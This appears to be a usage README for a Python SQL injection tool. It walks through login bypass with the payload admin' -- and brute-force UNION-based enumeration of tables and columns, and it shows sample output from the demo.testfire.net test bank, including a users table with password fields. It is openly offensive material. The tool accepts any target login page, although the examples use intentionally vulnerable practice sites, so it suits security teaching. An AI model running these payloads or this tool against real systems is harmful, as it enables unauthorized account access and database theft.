======================================================================================================================
 SQL Injection Tool
======================================================================================================================
By: Seyedeh Arta Razavi
______________________________________________________________________________________________________________________
Login bypass
______________________________________________________________________________________________________________________
*******************~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~********************************~~~~~~~~~~~~~~~~~~~~~~~~*************
one side note about this lab the site I use for most of my demonstrations 
http://demo.testfire.net/bank/login.aspx
occasionally goes down (im assuming for routine maintenance) so if you try to test the site
and it tells you there is an error or the page is down please wait like 30 min and try again
thank you :)
*******************~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~********************************~~~~~~~~~~~~~~~~~~~~~~~~*************

To run the sql injection script run the following command
$ python3 sql.py

When prompted to fill in options fill them in as so:

Which site to sql inject into (provide login page link): [input the login page link to the site you wish to inject]
bellow are some live test targets to test login bypass sql injection on

For login bypass:
http://demo.testfire.net/bank/login.aspx (does not require email address)
http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F (does not require email address)
http://www.techpanda.org/index.php (requires email address)

Does site require email as username? enter yes or none: [enter "yes" or "none" based on link chosen above]

(then the script will print all available input fields on page with their submit buttons)
================================================================
Inputs on page http://demo.testfire.net/bank/login.aspx
================================================================
TYPE INPUT FIELD|| Name: uid
TYPE INPUT FIELD|| Name: passw
TYPE SUBMIT|| Name: btnSubmit  value: Login
================================================================

When login is bypassed the script will print 

LOGGED IN!
username: [ working username ]
password: [ working password ]

All visible links after login:
[1][a list of visible links after login]
[2][ ... ]
[3][ ... ]

you can now log into the site using the above username and password

then you will be prompted

which link to visit enter number or none: [enter the number of the link you wish to visit or "none"]
if you wish to continue injection enter the number next to the link you wish to visit next after logging in
if you just wanted to login simply enter "none" and the script will stop running


______________________________________________________________________________________________________________________
Table and Column Injection
______________________________________________________________________________________________________________________

To run the sql injection script run the following command
$ python3 sql.py

When prompted to fill in options fill them in as so:

Which site to sql inject into (provide login page link): [input the login page link to the site you wish to inject]
bellow are some live test targets to test table and column sql injection on

For sql table injection:
http://demo.testfire.net/bank/login.aspx (does not require email address)

Does site require email as username? enter yes or none: [enter "yes" or "none" based on link chosen above]
For this example do
Does site require email as username? enter yes or none: none

When login is bypassed the script will print 

(then the script will print all available input fields on page with their submit buttons)
================================================================
Inputs on page http://demo.testfire.net/bank/login.aspx
================================================================
TYPE INPUT FIELD|| Name: uid
TYPE INPUT FIELD|| Name: passw
TYPE SUBMIT|| Name: btnSubmit  value: Login
================================================================

(this if what will print for this example)
LOGGED IN!
username: admin' --
password: admin' --

All visible links after login:
[1]http://demo.testfire.net/bank/main.aspx
[2]http://demo.testfire.net/bank/transfer.aspx
[3]http://demo.testfire.net/bank/transaction.aspx
[4]http://demo.testfire.net/bank/logout.aspx
[5]http://demo.testfire.net/bank/customize.aspx
[6]http://demo.testfire.net/bank/queryxpath.aspx

which link to visit enter number or none: [enter the number next to the link you wish to sql table inject into]
for this example visit the transaction link (this number may change depending on how the list is ordered)
which link to visit enter number or none: 3

for this example the script will print out

(this is showing the input fields in the page the scipt posted the sql injection to)
================================================================
Inputs on page http://demo.testfire.net/bank/transaction.aspx
================================================================
TYPE INPUT FIELD|| Name: after
TYPE INPUT FIELD|| Name: before
================================================================

(the script will then ask you for acceptable inputs for the fields provided)
(this is because it will append the attack string to the end of the acceptable inputs)
(for the case of this lab enter a date that is not happened yet to get an empty table)
(this is so its easier to look at)

what is an acceptable input for field after: 1/1/2020
what is an acceptable input for field before: 1/2/2020

then the script will start brute forcing to find out how many columns are in the table on the page
the script does this by going through a list of popular table names (from FuzzyDB)
source for table names: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/GetTABLES
and trying each possible table name with 1 - 10 columns until a table name works with that many columns 
and also trying each column length with all possible sql comments ["--", "#", "/*"]
until a combination of number of columns and comment style works and then it will continue to brute force the rest
of the table names with the column length and comment style chosen

(this is the table names found on the page)
================================================================
Finding table names using list provided
================================================================
Brute forcing table name 40/40

(these are the attack strings you would have to use on the page to get tables to dump information)

There are 4 columns in the table on the page
The comment syntax is --
Attack string for field name after is: 1/1/2020 union select 1,1,1,1 from [table name]--
Attack string for field name before is: 1/2/2020 union select 1,1,1,1 from [table name]--

[1]transactions
[2]accounts
[3]users
[4]subscribe
================================================================

after finding the table names the script will try to brute force the column names to figure out what columns
are in each table. This is a similar approach to finding the table names it brute forces the column names
form a list of popular column names obtained from FuzzyDB
source for column names: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/GetCOLUMNS
it does this until it finds all possible column names from the table names it found earlier

(this is the columns found in each table)
================================================================
finding column names using list provided
================================================================
Brute forcing column name 40/40 for table users

Brute forcing column name 40/40 for table subscribe

Brute forcing column name 40/40 for table transactions

Brute forcing column name 40/40 for table accounts

users: first_name, userid, username, last_name, password
subscribe: email
transactions: accountid, description
accounts: accountid, userid
================================================================

then the user will be prompted to say if they wish to write the output to a file

write to file? input file name + .txt or none: [enter file name followed by .txt or none]
for this example
write to file? input file name + .txt or none: output.txt

then you will have a file named output.txt saved in your directory containing all the table names
and their columnn names

then the script will run again asking you which link you would like to visit next just say none
which link to visit enter number or none: none
the script will exit